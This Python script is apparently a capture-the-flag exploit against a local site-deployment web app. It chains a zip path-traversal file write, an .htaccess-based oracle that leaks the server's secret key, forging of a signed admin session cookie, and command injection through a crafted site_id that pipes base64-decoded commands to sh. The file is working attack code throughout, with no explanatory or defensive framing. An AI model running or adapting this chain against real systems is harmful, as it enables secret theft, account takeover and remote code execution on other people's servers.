import base64
import hmac
import json
import os
import string
import time
import zipfile
from io import BytesIO
from urllib.parse import quote, unquote

import requests

url = "http://127.0.0.1:8080"


def register(session: requests.Session, username: str, password: str):
    data = {"username": username, "password": password, "confirm_password": password}
    response = session.post(f"{url}/api/auth/register", json=data)
    return response.json()


def login(session: requests.Session, username: str, password: str):
    data = {"username": username, "password": password}
    response = session.post(f"{url}/api/auth/login", json=data)
    return response.json()


def write_file(session: requests.Session, filename: str, content: bytes):
    manifest = {
        "webroot": "a/b/c/d",
    }
    io = BytesIO()
    exp = zipfile.ZipFile(io, "w")
    exp.writestr("manifest.json", json.dumps(manifest).encode())
    exp.writestr(
        f"a/b/c/d/../../../..{filename}",
        content,
    )
    exp.close()
    response = session.post(
        f"{url}/api/sites",
        files={"archive": ("exp.zip", io.getvalue(), "application/zip")},
    )
    return response.json()


def get_expr_result(session: requests.Session, expr: str, max_length: int = 1000):
    result = ""
    htaccess = """
<If "base64({expr}) =~ m#^{pattern}#">
    ErrorDocument 404 "114514"
</If>
"""
    letters = string.ascii_uppercase + string.ascii_lowercase + string.digits + "+/="
    for _ in range(max_length):
        old_len = len(result)
        for c in letters:
            pattern = (result + c).replace("+", "\\+")
            htaccess_content = htaccess.format(expr=expr, pattern=pattern)
            write_file(
                session,
                "/var/www/html/test/.htaccess",
                htaccess_content.encode(),
            )
            r = session.get(f"{url}/test/404.html")
            if "114514" in r.text:
                result += c
                print("Found:", result)
                break
        if len(result) == old_len:
            break
    return base64.b64decode(result)


def verify_secret_key(cookie: str, secret_key: bytes):
    digest = base64.b64decode(cookie[:44])
    data = cookie[44:].encode()
    expected = hmac.new(secret_key, data, "sha256").digest()
    return hmac.compare_digest(digest, expected)


def forge_admin_cookie(secret_key: bytes):
    session = requests.Session()
    username = os.urandom(8).hex()
    password = os.urandom(8).hex()
    register(session, username, password)
    login(session, username, password)
    cookie = unquote(session.cookies.get("salvo.session.id"))
    data = base64.b64encode(
        base64.b64decode(cookie[44:]).replace(
            # len(username) == 16, 16 + 2 == 0x12
            b"\x12" + b"\x00" * 7 + f'"{username}"'.encode(),
            # len("admin") == 5, 5 + 2 == 0x07
            b"\x07" + b"\x00" * 7 + '"admin"'.encode(),
        )
    )
    digest = hmac.new(secret_key, data, "sha256").digest()
    forged_cookie = base64.b64encode(digest).decode() + data.decode()
    print(f"[+] Forged admin cookie: {forged_cookie}")
    return forged_cookie


def leak_secret_key():
    session = requests.Session()
    username = os.urandom(8).hex()
    password = os.urandom(8).hex()
    register(session, username, password)
    login(session, username, password)
    secret_key = get_expr_result(session, "file('/app/.secretkey')")
    print(f"[+] Leaked secret key: {secret_key}")
    # We only need the first 32 bytes since only the first 32 bytes are used for signing.
    diff = 32 - len(secret_key)
    if diff > 0:
        print(
            f"[!] Leaked secret key is {diff} bytes shorter than needed! Probably due to \\x00 bytes."
        )
        secret_key += b"\x00"
        diff -= 1
        if diff > 0:
            print(
                f"[!] Still having {diff} bytes to bruteforce. Starting bruteforce..."
            )
            cookie = unquote(session.cookies.get("salvo.session.id"))
            for i in range(256**diff):
                attempt = secret_key + i.to_bytes(diff, "big")
                if verify_secret_key(cookie, attempt):
                    secret_key = attempt
                    print(f"[+] Found full secret key: {secret_key}")
                    break
            else:
                print("[-] Failed to bruteforce the remaining bytes")
                exit(1)
    print(f"[+] Final secret key: {secret_key[:32]}")
    return secret_key


def rce(cookie: str):
    session = requests.Session()
    session.cookies.set("salvo.session.id", cookie)
    cmd = base64.b64encode(b"/readflag > /var/www/html/flag.txt").decode()
    site_id = f'";echo {cmd}|base64 -d|sh;#'
    write_file(
        session,
        f"/app/data/{site_id}/manifest.json",
        json.dumps(
            {
                "site_id": site_id,
                "owner": "admin",
                "webroot": "webroot",
                "deployed_at": int(time.time()),
            }
        ).encode(),
    )
    session.get(f"{url}/api/sites/{quote(site_id)}")
    return session.get(f"{url}/flag.txt").text


if __name__ == "__main__":
    secret_key = leak_secret_key()
    admin_cookie = forge_admin_cookie(secret_key)
    flag = rce(admin_cookie)
    print(f"[+] Flag: {flag}")
